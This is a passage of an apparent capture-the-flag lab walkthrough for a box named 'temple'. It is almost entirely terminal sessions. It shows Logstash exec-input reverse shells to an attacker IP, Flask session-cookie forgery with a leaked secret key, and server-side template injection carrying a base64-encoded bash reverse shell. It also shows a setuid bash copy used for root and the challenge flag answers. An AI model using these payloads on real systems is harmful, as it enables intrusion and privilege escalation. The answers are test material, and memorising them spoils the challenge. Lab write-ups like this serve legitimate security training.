+#xpack.management.elasticsearch.api_key: "id:api_key"
+#xpack.management.elasticsearch.ssl.certificate_authority: [ "/path/to/ca.crt" ]
+#xpack.management.elasticsearch.ssl.truststore.path: /path/to/file
+#xpack.management.elasticsearch.ssl.truststore.password: password
+#xpack.management.elasticsearch.ssl.keystore.path: /path/to/file
+#xpack.management.elasticsearch.ssl.keystore.password: password
+#xpack.management.elasticsearch.ssl.verification_mode: certificate
+#xpack.management.elasticsearch.sniffing: false
+#xpack.management.logstash.poll_interval: 5s
+
+bill@temple:/etc/logstash/conf.d$ ls
+ls
+logstash-sample.conf
+bill@temple:/etc/logstash/conf.d$ cat *
+cat *
+```
+```bash
+# Sample Logstash configuration for creating a simple
+```
+```bash
+# Beats -> Logstash -> Elasticsearch pipeline.
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ cat logstash-sample.conf
+input {
+  exec {
+    command => "/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'"
+    interval => 5
+  }
+}
+
+output {
+  file {
+    path => "/tmp/output.log"
+    codec => rubydebug
+  }
+}
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.181.180 - - [24/Jan/2023 20:36:15] "GET /logstash-sample.conf HTTP/1.1" 200 -
+
+bill@temple:/etc/logstash/conf.d$ curl http://10.8.19.103:80/logstash-sample.conf -o logstash-sample.conf
+<103:80/logstash-sample.conf -o logstash-sample.conf
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --  0     0    0     0    0     0      0      0 --100   193  100   193    0     0    347      0 --100   193  100   193    0     0    346      0 --:--:-- --:--:-- --:--:--   346
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ rlwrap nc -lvnp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.181.180.
+Ncat: Connection from 10.10.181.180:44376.
+bash: cannot set terminal process group (1291): Inappropriate ioctl for device
+bash: no job control in this shell
+root@temple:/# whoami
+whoami
+root
+root@temple:/# cd /root
+cd /root
+root@temple:~# ls
+ls
+flag2.txt
+script.sh
+root@temple:~# cat flag2.txt
+cat flag2.txt
+f620630155081293669dbb7949f975fa9386f1cd
+root@temple:~# cat script.sh
+cat script.sh
+#!/bin/bash
+sleep 30
+/bin/systemctl start logstash.service
+
+Another method
+
+Logged in as <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
+
+SECRET_KEY:   f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ echo 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry' > secret_key
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ cat secret_key 
+f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ echo "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoie3tjb25maWd9fSJ9.Y9CI3Q.huUG93mqr9-Yr0sHZc3DaWR_3Lo" | base64 -d
+{"logged_in":true,"username":"{{config}}"}base64: invalid input
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask
+
+└─$ pip3 install flask-unsign
+Defaulting to user installation because normal site-packages is not writeable
+Collecting flask-unsign
+  Downloading flask-unsign-1.2.0.tar.gz (14 kB)
+  Preparing metadata (setup.py) ... done
+Requirement already satisfied: flask in /usr/lib/python3/dist-packages (from flask-unsign) (2.2.2)
+Requirement already satisfied: requests in /home/kali/.local/lib/python3.10/site-packages (from flask-unsign) (2.20.0)
+Requirement already satisfied: itsdangerous in /usr/lib/python3/dist-packages (from flask-unsign) (2.1.2)
+Requirement already satisfied: markupsafe in /usr/local/lib/python3.10/dist-packages (from flask-unsign) (2.1.1)
+Requirement already satisfied: werkzeug in /usr/lib/python3/dist-packages (from flask-unsign) (2.2.2)
+Requirement already satisfied: chardet<3.1.0,>=3.0.2 in /home/kali/.local/lib/python3.10/site-packages (from requests->flask-unsign) (3.0.4)
+Requirement already satisfied: urllib3<1.25,>=1.21.1 in /home/kali/.local/lib/python3.10/site-packages (from requests->flask-unsign) (1.24.3)
+Requirement already satisfied: idna<2.8,>=2.5 in /home/kali/.local/lib/python3.10/site-packages (from requests->flask-unsign) (2.6)
+Requirement already satisfied: certifi>=2017.4.17 in /home/kali/.local/lib/python3.10/site-packages (from requests->flask-unsign) (2017.7.27.1)
+Building wheels for collected packages: flask-unsign
+  Building wheel for flask-unsign (setup.py) ... done
+  Created wheel for flask-unsign: filename=flask_unsign-1.2.0-py3-none-any.whl size=14676 sha256=1dcb3fafc09b1d4ff5f9b7d0a6ce90e380aacc81633dbc453b8204bbbf0e30f4
+  Stored in directory: /home/kali/.cache/pip/wheels/9d/c8/87/dac6332479e7acaadecbe5f965d6732f64dfb6b3b97cbc1001
+Successfully built flask-unsign
+Installing collected packages: flask-unsign
+  WARNING: The script flask-unsign is installed in '/home/kali/.local/bin' which is not on PATH.
+  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
+Successfully installed flask-unsign-1.2.0
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ export PATH=/home/kali/.local/bin:$PATH
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoie3tjb25maWd9fSJ9.Y9CI3Q.huUG93mqr9-Yr0sHZc3DaWR_3Lo'
+{'logged_in': True, 'username': '{{config}}'}
+
+https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection
+
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
+.eJwdyEEKgCAQRuG7_KuC8ABdJWOwmkSYZkJrJd49afe9VyEWIx-UFPOTX57wFs4aLsaMWnfTM0VHtEsohagraXp-RLEtSJ-LhxWP1d12sw4e0mt0mcMxjK2hfX0vJGw.Y9CMgA.WETGAoKaBBvlVf_-dHVrYrMqgO8
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ flask-unsign --decode --cookie '.eJwdyEEKgCAQRuG7_KuC8ABdJWOwmkSYZkJrJd49afe9VyEWIx-UFPOTX57wFs4aLsaMWnfTM0VHtEsohagraXp-RLEtSJ-LhxWP1d12sw4e0mt0mcMxjK2hfX0vJGw.Y9CMgA.WETGAoKaBBvlVf_-dHVrYrMqgO8'
+{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__["os"].popen("ls").read()}}'}
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ echo 'bash -i >& /dev/tcp/10.8.19.103/1337 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK | base64 -d  
+bash -i >& /dev/tcp/10.8.19.103/1337 0>&1
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK | base64 -d | bash
+bash: connect: Connection refused
+bash: line 1: /dev/tcp/10.8.19.103/1337: Connection refused
+
+──(kali㉿kali)-[~/Downloads/temple]
+└─$ flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK | base64 -d | bash\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
+.eJwlyl0LgjAYBeC_Iu9VUnmRFuGdmEWlNwVBZYypa07mJk770Pzvjbo48JzD6YFLSkmGmAC3qVsygVaRWuCSgAt9n0pxZ9RCKOVYKYS0mGDND5TLBHM9XmOQKoabVcmKiFEMJM2lcS7XHfa9Bh-98Y55j8vmNAvtQ5H6y1fkO05YBHOdZ_TWvYvs7Ur_imBvfIwEK7JwjGn2dx6DadUEZyNzGGD4AmcvPM8.Y9CNlw.V4Jdzy5Tk8PmyAZAAwWsx6uW50c
+
+copy to session cookie
+
+.eJwlyl0LgjAYBeC_Iu9VUnmRFuGdmEWlNwVBZYypa07mJk770Pzvjbo48JzD6YFLSkmGmAC3qVsygVaRWuCSgAt9n0pxZ9RCKOVYKYS0mGDND5TLBHM9XmOQKoabVcmKiFEMJM2lcS7XHfa9Bh-98Y55j8vmNAvtQ5H6y1fkO05YBHOdZ_TWvYvs7Ur_imBvfIwEK7JwjGn2dx6DadUEZyNzGGD4AmcvPM8.Y9CNlw.V4Jdzy5Tk8PmyAZAAwWsx6uW50c
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ rlwrap nc -lvnp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.47.191.
+Ncat: Connection from 10.10.47.191:34360.
+bash: cannot set terminal process group (895): Inappropriate ioctl for device
+bash: no job control in this shell
+bill@temple:~/webapp$ whoami
+whoami
+bill
+bill@temple:~/webapp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+bill@temple:~/webapp$ cd /etc/logstash
+cd /etc/logstash
+bill@temple:/etc/logstash$ ls
+ls
+conf.d       log4j2.properties     logstash.yml   startup.options
+jvm.options  logstash-sample.conf  pipelines.yml
+bill@temple:/etc/logstash$ cd conf.d
+cd conf.d
+bill@temple:/etc/logstash/conf.d$ cat *
+cat *
+```
+```bash
+# Sample Logstash configuration for creating a simple
+```
+```bash
+# Beats -> Logstash -> Elasticsearch pipeline.
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ cat logstash-sample2.conf 
+input {
+  exec {
+    command => "cp /bin/bash /home/bill/shell; chmod +xs /home/bill/shell"
+    interval => 5
+  }
+}
+
+output {
+  file {
+    path => "/tmp/output.log"
+    codec => rubydebug
+  }
+}
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/temple]
+└─$ python3 -m http.server 80   
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.47.191 - - [24/Jan/2023 21:08:07] "GET /logstash-sample2.conf HTTP/1.1" 200 -
+
+bill@temple:/etc/logstash/conf.d$ curl http://10.8.19.103:80/logstash-sample2.conf -o logstash-sample.conf
+<03:80/logstash-sample2.conf -o logstash-sample.conf
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:--  0     0    0     0    0     0      0      0 --:--:-- --:--:--100   194  100   194    0     0    439      0 --:--:-- --:--:-- --:--:--   440
+
+bill@temple:~$ ls -lah
+ls -lah
+total 1.2M
+drwxr-xr-x 6 bill bill 4.0K Jan 25 02:09 .
+drwxr-xr-x 5 root root 4.0K Oct  3  2021 ..
+lrwxrwxrwx 1 bill bill    9 Jul 25  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 bill bill  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 bill bill 3.7K Apr  4  2018 .bashrc
+drwx------ 3 bill bill 4.0K Jul 24  2021 .cache
+-rw-r--r-- 1 root root   41 Jul 25  2021 flag1.txt
+drwx------ 3 bill bill 4.0K Jul 24  2021 .gnupg
+drwx------ 4 bill bill 4.0K Jul 24  2021 .local
+-rw-r--r-- 1 bill bill  807 Apr  4  2018 .profile
+-rwsr-sr-x 1 root root 1.1M Jan 25 02:09 shell
+drwxrwxr-x 3 bill bill 4.0K Jul 27  2021 webapp
+bill@temple:~$ ./shell -p
+./shell -p
+shell-4.4# whoami
+whoami
+root
+shell-4.4# cd /root
+cd /root
+shell-4.4# ls
+ls
+flag2.txt  script.sh
+shell-4.4# cat flag2.txt
+cat flag2.txt
+f620630155081293669dbb7949f975fa9386f1cd
+shell-4.4# cat script.sh
+cat script.sh
+#!/bin/bash
+sleep 30
+/bin/systemctl start logstash.service
+```
+![[Pasted image 20230124183644.png]]
+![[Pasted image 20230124211040.png]]
+Find flag1.txt
+Enumerate! Does the word templ(at)e mean anything?
+*7362bee1e78243f4811f26565137d5e20cbd9af0*
+Find flag2.txt
+Make sure to look carefully at the running processes.
+*f620630155081293669dbb7949f975fa9386f1cd*
+
+## Notes / Lessons Learned
+[[AllSignsPoint2Pwnage]]
+
